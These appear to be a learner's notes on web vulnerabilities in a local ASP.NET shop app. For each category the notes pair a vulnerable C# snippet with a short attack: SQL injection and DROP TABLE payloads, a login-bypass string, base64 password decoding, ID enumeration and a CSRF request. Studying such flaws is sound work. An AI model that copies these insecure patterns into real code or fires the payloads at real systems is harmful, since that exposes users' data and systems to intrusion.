1. SQL injection
    var products = _context.Products
                    .FromSqlRaw($"SELECT * FROM Products WHERE Name LIKE '%{query}%'")
                    .ToList();
        %' OR '1'='1'; -- 
        %'; DROP TABLE Products; --
        %'; DROP TABLE Products; --

2. Identification and Authentication Failures
    SELECT * FROM Users WHERE Username = '{1}' AND Password = '{2}'
        bypass:
        data = {
            "Username": "admin",
            "Password": "' OR '1'='1"
        }

3. Cryptographic Failures
    user.Password = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(user.Password));
        while database being leaked out:
        for enc in user.Password:
            print(base64.b64decode(enc))

4. Broken Access Control
    var product = _context.Products.Find(id);
        for i in range(100):
            req = request.get(url + "/Home/ProductDetails/" + str(i))
            print(req.text)

5. Insecure Design
    [HttpPost]
    public IActionResult AddToCart(int id)
    {
        return RedirectToAction("Index");
    }
        Can be easily to CSRF:
            fetch("http://localhost:5057/Home/AddToCart", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({ id: "1" })
            });